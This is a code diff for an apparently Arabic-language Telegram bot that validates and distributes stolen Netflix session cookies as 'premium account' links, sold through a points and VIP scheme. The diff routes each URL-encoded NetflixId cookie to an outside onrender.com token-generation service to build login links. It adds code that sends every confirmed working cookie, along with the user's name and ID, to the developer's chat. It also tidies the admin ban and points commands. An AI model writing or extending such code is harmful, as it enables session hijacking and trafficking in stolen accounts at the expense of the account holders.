@@ -184,16 +184,9 @@ def _threaded_cookies_check(chat_id, netflix_ids, reply_to_message_id, source_na
             
             full_cookie_string = f"NetflixId={netflix_id}"
             direct_netflix_url = "https://www.netflix.com/" if result["bypass"] else f"https://netflix.com/?nftoken={token}"
-encoded_cookie = urllib.parse.quote(full_cookie_string)
-        
-# كود توزيع الضغط المعدل بمسافات صحيحة
-import random
-api_hosts = [
-    "https://nftokengen-7ik6.onrender.com",
-    "https://netflixtokengenapi.onrender.com"
-]
-chosen_host = random.choice(api_hosts)
-bridge_login_url = f"{chosen_host}/nf/netflix?cookie={encoded_cookie}"
+            encoded_cookie = urllib.parse.quote(full_cookie_string)
+            bridge_login_url = f"https://nftokengen-7ik6.onrender.com/nf/netflix?cookie={encoded_cookie}"
+            
             res_text = f"🌟 **PREMIUM ACCOUNT** 🌟\n\n📁 المصدر: {source_name}\n• انتهاء الفواتير: {date_str}\n\n🔗 الرابط المباشر:\n{direct_netflix_url}"
             txt_entry = f"Cookie: {full_cookie_string}\nURL: {direct_netflix_url}\n====================\n\n"
             live_accounts_accumulator.append(txt_entry)
@@ -289,8 +282,13 @@ def add_points_command(message):
         return
     try:
         command_parts = message.text.split()
-        target_id = message.reply_to_message.chat.id if message.reply_to_message else int(command_parts[2])
-        amount = int(command_parts[1])
+        if message.reply_to_message:
+            target_id = message.reply_to_message.from_user.id
+            amount = int(command_parts[1])
+        else:
+            amount = int(command_parts[1])
+            target_id = int(command_parts[2])
+            
         if target_id not in USER_DATABASE: 
             USER_DATABASE[target_id] = {"points": 5, "username": "", "role": "MEMBER"}
         USER_DATABASE[target_id]["points"] += amount
@@ -304,7 +302,7 @@ def set_vip_command(message):
         return
     try:
         command_parts = message.text.split()
-        target_id = message.reply_to_message.chat.id if message.reply_to_message else int(command_parts[1])
+        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
         if target_id not in USER_DATABASE: 
             USER_DATABASE[target_id] = {"points": 5, "username": "", "role": "MEMBER"}
         USER_DATABASE[target_id]["role"] = "VIP"
@@ -318,7 +316,7 @@ def ban_user_command(message):
         return
     try:
         command_parts = message.text.split()
-        target_id = message.reply_to_message.chat.id if message.reply_to_message else int(command_parts[1])
+        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
         BANNED_USERS.add(target_id)
         bot.reply_to(message, f"🚫 تم حظر المستخدم `{target_id}` بنجاح.")
     except Exception:
@@ -330,7 +328,7 @@ def unban_user_command(message):
         return
     try:
         command_parts = message.text.split()
-        target_id = message.reply_to_message.chat.id if message.reply_to_message else int(command_parts[1])
+        target_id = message.reply_to_message.from_user.id if message.reply_to_message else int(command_parts[1])
         BANNED_USERS.discard(target_id)
         bot.reply_to(message, f"🟢 تم إلغاء حظر المستخدم `{target_id}` بنجاح.")
     except Exception:
@@ -381,7 +379,6 @@ def execute_dispense_logic(chat_id):
                 InlineKeyboardButton("💻 دخول للكمبيوتر", url=direct_netflix_url), 
                 InlineKeyboardButton("📺 تفعيل شاشة TV", url="https://www.netflix.com/tv8")
             )
-            # زر طلب الطريقة الجديد الموجه لقناتك التليجرام
             user_markup.add(InlineKeyboardButton("📺 كيف أستخدم الرابط؟", callback_data="ask_how_to_use"))
             user_markup.add(
                 InlineKeyboardButton("✅ نعم، اشتغل تماماً", callback_data=f"fb_yes_{short_id}"), 
@@ -401,7 +398,6 @@ def execute_dispense_logic(chat_id):
 @check_ban
 def handle_ask_method(call):
     bot.answer_callback_query(call.id)
-    # إرسال الطلب مع زر مباشر ينقله لقناتك
     chan_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("🔗 اضغط هنا لمشاهدة الطريقة", url=CHANNEL_LINK))
     bot.send_message(
         call.message.chat.id, 
@@ -438,16 +434,15 @@ def pool_status(call):
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
 @check_ban
-@bot.callback_query_handler(func=lambda call: call.data.startswith('fb_'))
-@check_ban
 def handle_user_feedback(call):
     global VALID_COOKIES_POOL
     data_parts = call.data.split('_')
     action, short_id = data_parts[1], data_parts[2]
     
+    user_info = call.from_user
+    username = f"@{user_info.username}" if user_info.username else "لا يوجد"
     chat_id = call.message.chat.id
     
-    # البحث عن الحساب التالف في المخزن
     target_cookie = None
     for cookie in VALID_COOKIES_POOL:
         if cookie.startswith(short_id):
@@ -455,36 +450,43 @@ def handle_user_feedback(call):
             break
 
     if action == "yes":
-        # المستخدم أكد أن الحساب يعمل
         bot.answer_callback_query(call.id, "شكراً على تقييمك! مشاهدة ممتعة 🍿🔥", show_alert=True)
         try: 
             bot.edit_message_text("✅ **شكراً واستمتع! 🎬🍿**\n\nتم تأكيد عمل الرابط بنجاح، مشاهدة ممتعة!", chat_id, call.message.message_id, reply_markup=None)
         except Exception: 
             pass
         
+        if target_cookie:
+            dev_log_text = f"👑 **سحب ناجح!** 👑\n👤 المستعمل: {user_info.first_name} ({username})\n🆔 الأيدي: `{user_info.id}`\n🍪 الكوكيز الفعال:\n`NetflixId={target_cookie}`"
+            try: 
+                bot.send_message(DEVELOPER_CHAT_ID, dev_log_text, parse_mode="Markdown")
+            except Exception: 
+                pass
+        
     elif action == "no":
-        # 1. حذف الحساب التالف من المخزن
         if target_cookie and target_cookie in VALID_COOKIES_POOL:
             VALID_COOKIES_POOL.remove(target_cookie)
-            bot.answer_callback_query(call.id, "⚠️ تم حذف الحساب التالف، جاري تعويضك بحساب جديد وخصم 1 نقطة...", show_alert=True)
+            bot.answer_callback_query(call.id, "⚠️ تم الإبلاغ وحذف الحساب التالف، جاري تعويضك فوراً...", show_alert=True)
+            try: 
+                bot.send_message(DEVELOPER_CHAT_ID, f"❌ تم حذف حساب ميت أبلغ عنه المستخدم: {user_info.first_name}\n🍪 `NetflixId={target_cookie}`")
+            except Exception: 
+                pass
         else:
-            bot.answer_callback_query(call.id, "👌 الحساب غير موجود في المخزن، جاري محاولة سحب حساب جديد...", show_alert=False)
+            bot.answer_callback_query(call.id, "👌 تم تصفية هذا الحساب مسبقاً، جاري استخراج بديل لك...", show_alert=False)
             
-        # 2. تحديث الرسالة للمستخدم
         try: 
-            bot.edit_message_text("❌ تم حذف الحساب التالف! جاري سحب حساب جديد لك فوراً... ⏳", chat_id, call.message.message_id, reply_markup=None)
+            bot.edit_message_text("❌ تم حذف الرابط القديم لعدم عمله! جاري سحب حساب جديد لك فوراً وخصم 1 نقطة... ⏳", chat_id, call.message.message_id, reply_markup=None)
         except Exception: 
             pass
 
-        # 3. سحب حساب جديد (دالة execute_dispense_logic تقوم بخصم النقطة تلقائياً إذا لم يكن VIP)
         response = execute_dispense_logic(chat_id)
-        
         if response["status"] == "success":
             bot.send_message(chat_id, response["text"], reply_markup=response["markup"], parse_mode="Markdown")
         elif response["status"] == "no_points":
-            bot.send_message(chat_id, "❌ رصيد نقاطك انتهى! لا يمكن تعويضك بحساب جديد حتى تشحن.", reply_markup=generate_main_keyboard(chat_id))
+            bot.send_message(chat_id, "❌ رصيد نقاطك انتهى تماماً! لا يمكن تعويضك بحساب جديد تلقائياً حتى تشحن.", reply_markup=generate_main_keyboard(chat_id))
         else:
             bot.send_message(chat_id, response["message"])
+
 def open_admin_panel_msg(chat_id):
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("📢 إرسال إذاعة جماعية (Broadcast)", callback_data="admin_broadcast"))
